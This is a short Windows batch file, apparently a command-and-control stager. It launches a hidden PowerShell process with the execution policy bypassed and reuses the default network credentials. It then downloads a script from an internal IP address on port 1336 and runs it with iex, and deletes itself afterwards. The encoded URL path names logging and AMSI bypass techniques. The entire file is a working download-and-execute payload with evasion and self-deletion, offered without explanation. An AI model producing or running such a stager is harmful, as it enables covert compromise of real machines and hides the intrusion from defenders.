@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.0.2.15:1336/download/powershell/VG9rZW5cQWxsXDE6ZXR3IFNjcmlwdEJsb2NrTG9nQnlwYXNzIFJhc3RhTW91c2UgTGliZXJtYW4gaXJvbnB5dGhvbl9hbXNpIG1hdHRpZmVzdGF0aW9u') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
